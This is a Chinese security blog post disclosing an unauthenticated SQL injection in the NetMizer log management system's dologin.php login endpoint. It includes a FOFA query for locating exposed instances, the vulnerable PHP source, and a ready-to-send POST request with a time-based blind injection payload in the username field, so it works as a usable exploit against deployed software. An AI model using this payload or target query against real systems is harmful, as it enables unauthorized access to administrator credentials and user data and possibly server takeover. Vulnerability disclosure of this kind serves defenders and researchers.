---
title: "NetMizer日志管理系统 dologin.php SQL注入漏洞"
source: https://mrxn.net/jswz/netmizer-data-login-dologin-username-sqli.html
---

# NetMizer日志管理系统 dologin.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/15 08:32
* 871浏览
* [0评论](#comment)
* 2小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的
`/data/login/dologin.php`
接口处存在
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞，未经身份验证的恶意攻击者利用
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下
`/data/login/dologin.php`
业务实现关键逻辑部分

```
<?php
    include("../include/JSON.php");

    $conn_id = mysql_connect($dsn,$dbuser,$dbpasswd);
    mysql_select_db("sysmonitor");

    $sqltable = "tbl_admin";
    $sqlfrom = $sqltable;

    $sqlsessiontable = "tbl_admin_session";
    $sqlsessionfrom = $sqlsessiontable;

    $allow_wrongnum = 3;

    function gen_session($name, $ifsuccess){
       global $sqlsessionfrom;
       global $sqlfrom;
       global $allow_wrongnum;

       $t=time();
       $ip = ip2long(getIP());
       $usersessionid= $_COOKIE["usersessionid"];

       $sqlstr = "SELECT DISTINCT user_name,wrong_times from $sqlsessionfrom where session_id='$usersessionid' and access_time>=".($t-300);
       $res=mysql_query($sqlstr);
       $have = 0;
       $wrong_times = 0;
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $have = 1;
          $wrong_times = $row['wrong_times'];
       }
       if($ifsuccess){
          if($have == 0){
             $usersessionid=md5($t.$name);
             setcookie("usersessionid", "$usersessionid", $t + 3600, "/");
             $cmd1="insert into $sqlsessionfrom (session_id,user_name,login_time,access_time,wrong_times,login_ip) VALUES('$usersessionid','$name',$t,$t,0,'$ip')";
          } else {
             $cmd1 = "update tbl_admin_session set access_time=$t,wrong_times=0 where session_id='$usersessionid'";

          }
          $cmd2="delete from $sqlsessionfrom where access_time<".($t-3600);
          $ret = mysql_query($cmd1);
          $ret = mysql_query($cmd2);
       } else {
          if($have){
             $wrong_times = $wrong_times + 1;
             if($wrong_times == $allow_wrongnum){
                if($name == "admin") $errstr = "密码失败次数过多，等待5分钟后再登录";
                else {
                   $sqlstr = "update $sqlfrom set status=0,disable_time=$t where username='$name'";
                   $res=mysql_query($sqlstr);
                   $errstr = "密码失败次数过多，账户已经被禁止<br>联系管理员解除禁止,且等待5分钟后再登录";
                }
                echo "{'success':true, 'datas':'$errstr'}";
                exit();
             }
             $sqlstr = "update tbl_admin_session set access_time=$t,wrong_times=$wrong_times where session_id='$usersessionid'";
             $res=mysql_query($sqlstr);
          } else {
             $usersessionid=md5($t.$name);
             setcookie("usersessionid", "$usersessionid", $t + 3600, "/");
             $cmd1="insert into $sqlsessionfrom (session_id,user_name,login_time,access_time,wrong_times,login_ip) VALUES('$usersessionid','$name',$t,$t,1,'$ip')";
             $cmd2="delete from $sqlsessionfrom where access_time<".($t-3600);
             $ret = mysql_query($cmd1);
             $ret = mysql_query($cmd2);
          }
       }
       return $ret;
    }

    function do_sql_login($username, $password) {
       global $sqlfrom;
       global $jump;
       if($jump){
          $username = "admin";
          $session = gen_session($username, 0);
          mysql_close($conn_id);
          return 0;
       }
       $sqlstr = "SELECT password,status FROM $sqlfrom WHERE username='".$username."'";
       $res = mysql_query($sqlstr);
       if($res){
          $have = 0;
          while($row = mysql_fetch_array($res,MYSQL_BOTH)){
             $have = 1;
             $status = $row["status"];
             if($status == 0) return -3;
             $pwd = $row["password"];
             if($password!="") $password = crypt($password,"poseidon");
             if($pwd == $password){
                $session = gen_session($username, 1);
                mysql_close($conn_id);
                return 0;
             } else {
                $session = gen_session($username, 0);
                mysql_close($conn_id);
                return -4;
             }
          }
          mysql_close($conn_id);
          if($have == 0) return -2;
       } else return -1;
    }

    if(!isset($jump)) $jump = 0;
    if($action == 'login'){
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');
       $passwd = mb_convert_encoding($passwd, 'gbk', 'UTF-8');

       $res = do_sql_login($username,$passwd);
       if($res < 0){
          if($res == -1) $errstr = "连接数据库失败";
          else if($res == -2) $errstr = "该用户不存在";
          else if($res == -3) $errstr = "该用户处于禁止状态";
          else if($res == -4) $errstr = "密码错误<br>连续错误".$allow_wrongnum."次后账户将会被禁止登录";
          echo "{'success':true, 'datas':'$errstr'}";
       } else {
          if($jump) echo "<meta http-equiv=\"Refresh\" content=\"2; url=../../main.html\">"; 
          else echo '{"success":true, "datas":"success"}';
       }
       mysql_close($conn_id);
       return;
    } else if($action == 'changepw'){
       $old_password = mb_convert_encoding($old_password, 'gbk', 'UTF-8');
       $new_password = mb_convert_encoding($new_password, 'gbk', 'UTF-8');

       $usersessionid= $_COOKIE["usersessionid"];
       $sqlstr = "SELECT DISTINCT user_name from $sqlsessionfrom where session_id='$usersessionid' ";
       $res=mysql_query($sqlstr);
       $username = "";
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $username = $row["user_name"];
       }
       if($username == ""){
          $errstr = "查询不到该用户！";
          echo "{'success':false,'info':'$errstr'}";
          return;
       }

       $sqlstr = "SELECT password FROM $sqlfrom WHERE username='".$username."'";
       $res = mysql_query($sqlstr);
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $pwd = $row["password"];
          if($old_password!="") $password = crypt($old_password,"poseidon");
          if($pwd != $password){
             $errstr = "旧密码错误！";
             echo "{'success':false,'info':'$errstr'}";
             return;
          }
       }

       $newpasswd = crypt($new_password,"poseidon");
       $cmd="update $sqlfrom set password='$newpasswd' where username='".$username."'";
       $ret = mysql_query($cmd);
       mysql_close($conn_id);
       $errstr = "修改成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } else if($action == 'show'){
       checkop('adminconf_r');
       $sqlstr = "select * from $sqlfrom";
       $res=mysql_query($sqlstr);
       $arr_result = array();
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $arr_result[] = array(
             'username'=>$row['username'],
             'password'=>'no change rdh',
             'status'=>$row['status'],
             'disable_time'=>date('Y-m-d H:i:s', $row['disable_time']),
             'right0'=>$row['right0'],
             'right1'=>$row['right1'],
             'right2'=>$row['right2'],
             'right3'=>$row['right3'],
             'right4'=>$row['right4'],
             'right5'=>$row['right5'],
             'right6'=>$row['right6'],
             'right7'=>$row['right7'],
          );
       }
       mysql_close($conn_id);
       $str = array("success"=>true, "datas"=>$arr_result);
       $json = json_encode($str);
       echo $json;
       return;
    } else if($action == 'new'){
       checkop('adminconf_w');
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');
       $password = mb_convert_encoding($password, 'gbk', 'UTF-8');

       $sqlstr = "select * from $sqlfrom where username='$username'";
       $res=mysql_query($sqlstr);
       $have = 0;
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $have = 1;
       }
       if($have){
          $errstr = mb_convert_encoding("用户已经存在！", 'UTF-8', 'gbk');
          $errstr = "用户已经存在！";
          echo "{'success':false, 'info':'$errstr'}";
          return;
       }

       if($status == 0) $disable_time = time();
       else $disable_time = 0;

       $newpasswd = crypt($password,"poseidon");
       $sqlstr = "insert into $sqlfrom (username,password,status,disable_time,right0,right1,right2,right3,right4,right5,right6,right7) values('$username','$newpasswd',$status,$disable_time,$right0,$right1,$right2,$right3,$right4,$right5,$right6,$right7);";
       $res=mysql_query($sqlstr);
       mysql_close($conn_id);
       $errstr = "增加成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } else if($action == 'modify'){
       checkop('adminconf_w');
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');
       $password = mb_convert_encoding($password, 'gbk', 'UTF-8');

       $sqlstr = "select * from $sqlfrom where username='$username'";
       $res=mysql_query($sqlstr);
       $arr_set = array();
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          if($password != 'no change rdh') $arr_set['password'] = crypt($password,"poseidon");
          if($status != $row['status']) $arr_set['status'] = $status;
          if($right0 != $row['right0']) $arr_set['right0'] = $right0;
          if($right1 != $row['right1']) $arr_set['right1'] = $right1;
          if($right2 != $row['right2']) $arr_set['right2'] = $right2;
          if($right3 != $row['right3']) $arr_set['right3'] = $right3;
          if($right4 != $row['right4']) $arr_set['right4'] = $right4;
          if($right5 != $row['right5']) $arr_set['right5'] = $right5;
          if($right6 != $row['right6']) $arr_set['right6'] = $right6;
          if($right7 != $row['right7']) $arr_set['right7'] = $right7;
       }

       $setstr = "set ";
       $first = 1;
       foreach($arr_set as $k => $v){
          if($first == 1) $first = 0;
          else $setstr .= " , ";

          if($k == 'password') $setstr .= "$k='$v'";
          else $setstr .= "$k=$v";
       }

       $sqlstr = "update $sqlfrom $setstr where username='$username'";
       $res=mysql_query($sqlstr);
       mysql_close($conn_id);
       $errstr = "修改成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } else if($action == 'delete'){
       checkop('adminconf_w');
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');

       $sqlstr = "delete from $sqlfrom where username='$username'";
       $res=mysql_query($sqlstr);
       mysql_close($conn_id);
       $errstr = "删除成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } else if($action == 'u_enable' || $action == 'u_disable'){
       checkop('adminconf_w');
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');

       if($action == 'u_enable') $status = 1;
       else $status = 0;

       if($status == 0) $disable_time = time();
       else $disable_time = 0;

       $sqlstr = "update $sqlfrom set status=$status,disable_time=$disable_time where username='$username'";
       $res=mysql_query($sqlstr);
       mysql_close($conn_id);
       $errstr = "操作成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } 
?>
```

在
`gen_session`
和
`do_sql_login`
方法内部，以及多个 action 分支里，均存在直接将参数拼接进SQL语句中执行，造成
[SQL注入](https://mrxn.net/tag/SQL注入)
漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
利用示例

```
POST /data/login/dologin.php HTTP/1.1
Host: netmizer.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=login&username=' AND (SELECT 123 FROM (SELECT(SLEEP(3)))ABC) AND 'AAA'='AAA&passwd=123456
```

成功延时 3 秒

![NetMizer日志管理系统 dologin.php SQL注入漏洞](https://image.mrxn.net/617b8200f1e44af0a62fd5cb47ea4793.webp)

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[NetMizer日志管理系统 dologin.php SQL注入漏洞](https://mrxn.net/jswz/netmizer-data-login-dologin-username-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/netmizer-data-login-dologin-username-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-login-dologin-username-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-login-dologin-username-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});